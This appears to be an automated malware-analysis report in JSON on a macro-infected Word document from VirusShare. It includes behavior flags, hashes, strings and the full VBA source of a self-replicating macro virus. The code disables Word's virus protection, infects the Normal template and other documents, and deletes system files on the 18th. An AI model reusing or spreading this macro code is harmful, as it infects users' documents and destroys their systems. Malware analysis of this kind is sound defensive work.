{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CodeModule": "May attempt to modify the VBA code",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Kill": "May delete a file",
            "Open": "May open a file",
            "Output": "May write to a file",
            "Print #": "May write to a file",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "autoexec": "Runs when the Word document is opened",
            "system": "May run an executable file or a system command on a Mac",
            "windows": "May enumerate application windows"
        },
        "macro": "Private Sub Document_Open()\nOn Error Resume Next\ns = ActiveDocument.Saved\nApplication.EnableCancelKey = Not -1\nWith Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With\nIf Dir(\"c:\\windows\\temp\\temp.asc\", 0) = \"\" Then\nOpen \"c:\\windows\\temp\\temp.asc\" For Output As #1\nFor i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines\na = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)\nPrint #1, a\nNext i\nClose #1\nSetAttr \"c:\\windows\\temp\\temp.asc\", 1\nEnd If\nDim Heute, Tag\nHeute = Now\nTag = Day(Heute)\nIf Tag = 18 Then\nKill \"c:\\autoexec.bat\"\nKill \"c:\\config.sys\"\nKill \"c:\\windows\\system.*\"\nKill \"c:\\windows\\user.*\"\nKill \"c:\\windows32\\system.*\"\nKill \"c:\\windows32\\user.*\"\nEnd If\nIf NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> \"Private Sub Document_Open()\" Then\nSet t = NormalTemplate.VBProject.VBComponents.Item(1)\nElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> \"Private Sub Document_Open()\" Then\nSet t = ActiveDocument.VBProject.VBComponents.Item(1)\nElse\nt = \"\"\nEnd If\nIf t <> \"\" Then\nOpen \"c:\\windows\\temp\\temp.asc\" For Input As #1\nIf LOF(1) = 0 Then GoTo q\ni = 1\nDo While Not EOF(1)\nLine Input #1, a\nt.CodeModule.InsertLines i, a\ni = i + 1\nLoop\nq:\nClose #1\nWith Dialogs(wdDialogFileSummaryInfo): .Title = \"Total Annihilation\": .Author = \"Cavedog Ent.\": .Execute: End With\nIf Left(ActiveDocument.Name, 8) <> \"Dokument\" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName\nEnd If\nIf ActiveDocument.Saved <> s Then ActiveDocument.Saved = s\nEnd Sub\n\n' Processing file: VirusShare_3b264ef61fe3be1554ef657cd439602a\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 3715 bytes\n' Line #0:\n' \tFuncDefn (Private Sub Document_Open())\n' Line #1:\n' \tOnError (Resume Next) \n' Line #2:\n' \tLd ActiveDocument \n' \tMemLd Saved \n' \tSt s \n' Line #3:\n' \tLitDI2 0x0001 \n' \tUMi \n' \tNot \n' \tLd Application \n' \tMemSt EnableCancelKey \n' Line #4:\n' \tStartWithExpr \n' \tLd Options \n' \tWith \n' \tBoS 0x0000 \n' \tLitDI2 0x0000 \n' \tMemStWith ConfirmConversions \n' \tBoS 0x0000 \n' \tLitDI2 0x0000 \n' \tMemStWith VirusProtection \n' \tBoS 0x0000 \n' \tLitDI2 0x0000 \n' \tMemStWith SaveNormalPrompt \n' \tBoS 0x0000 \n' \tEndWith \n' Line #5:\n' \tLitStr 0x0018 \"c:\\windows\\temp\\temp.asc\"\n' \tLitDI2 0x0000 \n' \tArgsLd Dir 0x0002 \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIfBlock \n' Line #6:\n' \tLitStr 0x0018 \"c:\\windows\\temp\\temp.asc\"\n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Output)\n' Line #7:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd MacroContainer \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tFor \n' Line #8:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd MacroContainer \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tSt a \n' Line #9:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLd a \n' \tPrintItemNL \n' Line #10:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #11:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #12:\n' \tLitStr 0x0018 \"c:\\windows\\temp\\temp.asc\"\n' \tLitDI2 0x0001 \n' \tArgsCall SetAttr 0x0002 \n' Line #13:\n' \tEndIfBlock \n' Line #14:\n' \tDim \n' \tVarDefn Heute\n' \tVarDefn Tag\n' Line #15:\n' \tLd Now \n' \tSt Heute \n' Line #16:\n' \tLd Heute \n' \tArgsLd Day 0x0001 \n' \tSt Tag \n' Line #17:\n' \tLd Tag \n' \tLitDI2 0x0012 \n' \tEq \n' \tIfBlock \n' Line #18:\n' \tLitStr 0x000F \"c:\\autoexec.bat\"\n' \tArgsCall Kill 0x0001 \n' Line #19:\n' \tLitStr 0x000D \"c:\\config.sys\"\n' \tArgsCall Kill 0x0001 \n' Line #20:\n' \tLitStr 0x0013 \"c:\\windows\\system.*\"\n' \tArgsCall Kill 0x0001 \n' Line #21:\n' \tLitStr 0x0011 \"c:\\windows\\user.*\"\n' \tArgsCall Kill 0x0001 \n' Line #22:\n' \tLitStr 0x0015 \"c:\\windows32\\system.*\"\n' \tArgsCall Kill 0x0001 \n' Line #23:\n' \tLitStr 0x0013 \"c:\\windows32\\user.*\"\n' \tArgsCall Kill 0x0001 \n' Line #24:\n' \tEndIfBlock \n' Line #25:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x001B \"Private Sub Document_Open()\"\n' \tNe \n' \tIfBlock \n' Line #26:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet t \n' Line #27:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x001B \"Private Sub Document_Open()\"\n' \tNe \n' \tElseIfBlock \n' Line #28:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet t \n' Line #29:\n' \tElseBlock \n' Line #30:\n' \tLitStr 0x0000 \"\"\n' \tSt t \n' Line #31:\n' \tEndIfBlock \n' Line #32:\n' \tLd t \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIfBlock \n' Line #33:\n' \tLitStr 0x0018 \"c:\\windows\\temp\\temp.asc\"\n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Input)\n' Line #34:\n' \tLitDI2 0x0001 \n' \tArgsLd LOF 0x0001 \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tGoTo q \n' \tEndIf \n' Line #35:\n' \tLitDI2 0x0001 \n' \tSt i \n' Line #36:\n' \tLitDI2 0x0001 \n' \tArgsLd EOF 0x0001 \n' \tNot \n' \tDoWhile \n' Line #37:\n' \tLitDI2 0x0001 \n' \tLd a \n' \tLineInput \n' Line #38:\n' \tLd i \n' \tLd a \n' \tLd t \n' \tMemLd CodeModule \n' \tArgsMemCall InsertLines 0x0002 \n' Line #39:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt i \n' Line #40:\n' \tLoop \n' Line #41:\n' \tLabel q \n' Line #42:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #43:\n' \tStartWithExpr \n' \tLd wdDialogFileSummaryInfo \n' \tArgsLd Dialogs 0x0001 \n' \tWith \n' \tBoS 0x0000 \n' \tLitStr 0x0012 \"Total Annihilation\"\n' \tMemStWith Title \n' \tBoS 0x0000 \n' \tLitStr 0x000C \"Cavedog Ent.\"\n' \tMemStWith Author \n' \tBoS 0x0000 \n' \tArgsMemCallWith Execute 0x0000 \n' \tBoS 0x0000 \n' \tEndWith \n' Line #44:\n' \tLd ActiveDocument \n' \tMemLd New \n' \tLitDI2 0x0008 \n' \tArgsLd LBound 0x0002 \n' \tLitStr 0x0008 \"Dokument\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed FileName \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0001 \n' \tEndIf \n' Line #45:\n' \tEndIfBlock \n' Line #46:\n' \tLd ActiveDocument \n' \tMemLd Saved \n' \tLd s \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd s \n' \tLd ActiveDocument \n' \tMemSt Saved \n' \tEndIf \n' Line #47:\n' \tEndSub \n"
    },
    "filename": "VirusShare_3b264ef61fe3be1554ef657cd439602a",
    "filesize": 29184,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 5.0, Code page: 1252, Title: Total Annihilation, Author: Cavedog Ent., Template: Normal, Last Saved By: MACRO, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Mon Nov 13 19:27:00 2000, Last Saved Time/Date: Mon Nov 13 19:27:00 2000, Number of Pages: 1, Number of Words: 8, Number of Characters: 47, Security: 0",
    "hashes": {
        "md5": "3b264ef61fe3be1554ef657cd439602a",
        "sha1": "54dc456851c9ec863ba70518cf916a527178ced1",
        "sha256": "90989eb1eab5aa32da405fdada69b2b19102bcf1609ed4954baa2367ff60af98"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            "Virus Infected Bait File",
            "Joe Hartmann - HAVS",
            "Virus Name: ",
            ". A!",
            "jK&jK&",
            "Total Annihilation",
            "Cavedog Ent.",
            "Normal",
            "MACRO",
            "Microsoft Word 8.0",
            "Total Annihilation",
            "Title",
            "_PID_GUID",
            "`\u0450\u0467M",
            "`\u0450\u0467M",
            "c:\\wX",
            "c:\\windows\\temp\\temp.asc",
            "c:\\windows\\temp\\temp.asc",
            "c:\\windows\\temp\\temp.asc",
            "c:\\autoexec.bat",
            "c:\\config.sys",
            "c:\\windows\\system.*",
            "c:\\windows\\user.*",
            "c:\\windows32\\system.*",
            "c:\\windows32\\user.*",
            "Private Sub Document_Open()",
            "Private Sub Document_Open()",
            "c:\\windows\\temp\\temp.asc",
            "Total Annihilation9",
            "Cavedog Ent.9",
            "Dokument",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "8 Sub ",
            "t_Open()",
            "On Err@or Res Next",
            ":ipplication.En3",
            "CancelKe",
            "Not -1",
            "With O",
            "s: .Co nfirm",
            "ve,rs",
            "rusProte",
            "6on ",
            "End ",
            "If Di",
            "r(\"c:\\windows\\t",
            ".asc\", ",
            "\"\" Th,en",
            "?Output As #",
            "1 To Mac",
            "/tainer.VB%j@,@",
            "@ComponsD.I (1)",
            ";deModule",
            "@untOfL",
            "(i, 1",
            "m@tnt) , a",
            "Al i0",
            "/SeNtX<",
            "Dim H",
            "e, Tag",
            "*Now",
            "Day(",
            "18WKil",
            "autoexec.bat",
            "g.sysI",
            "9-J%i",
            "9/1/ <> \"XjeN\u03400 !W",
            "ntG2?  ",
            "o_NEN?",
            "\" 7,tB$",
            "8QboInHo",
            "LOF iEN0\"L Gopq",
            "Vo Whi Eb",
            "ctIqIn It# h",
            "i + }Loo`p",
            "q:hBD",
            "ialogs(w",
            "Summ",
            "aryInfo)",
            "@Titb\"To",
            "tal Anni",
            "Auth",
            "og Ehnt.!",
            "Left(,1!A, 8)*DokcC#L",
            "Full",
            "33a1040b9",
            "Wordk",
            "Win16~",
            "Win32",
            "HAVS1B",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Documentj",
            "Document_Open",
            "ActiveDocument\\",
            "Savedd",
            "Application*",
            "EnableCancelKey",
            "Options",
            "ConfirmConversions",
            "VirusProtectionoD",
            "SaveNormalPrompt\u02bc",
            "MacroContainer>",
            "VBProjectOh",
            "VBComponents",
            "Itemz",
            "CodeModule",
            "CountOfLines!\\",
            "Lines",
            "SetAttrC",
            "Heute\u0657",
            "Tag&",
            "Now%",
            "Kill",
            "NormalTemplateq",
            "LOFc",
            "InsertLines",
            "Dialogs",
            "wdDialogFileSummaryInfo",
            "Title~",
            "Author",
            "ExecuteY",
            "SaveAsf;",
            "FileNamej",
            "FullName\u041e",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINNT\\S",
            "ystem32\\",
            "c2.tlb#O",
            "LE Autom`ation",
            "mMSForms",
            "6694014-",
            "26E3-43B",
            "1-A33A-1",
            "9218",
            "3.TWD#M",
            "icrosoft ",
            "` Ob",
            " LibraryG",
            "P326417",
            "AA-D3AC-",
            "4CEE-900",
            "5-CCF119@13FC22D",
            "OCUME~1\\@ADMINI",
            "L OCALS",
            "Temp\\VBE\\E-",
            "EXg-.E",
            "Za*l",
            "}NDYa}",
            "j 0\t1C",
            "Offi",
            "j2DF8D04C-5BF@h",
            "01B-BDE5i",
            "97\\C",
            "=O9`7.DLLj",
            " (8.0j",
            "isDocument",
            "D@Dc",
            "ThisDocument",
            "ID=\"{5875E9F9-1CA9-4BBC-B149-5AD0B66E725B}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"787A708674867486748674\"",
            "DPB=\"F0F2F8FBF9FBF9FB\"",
            "GC=\"686A60736173618C\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.305184",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
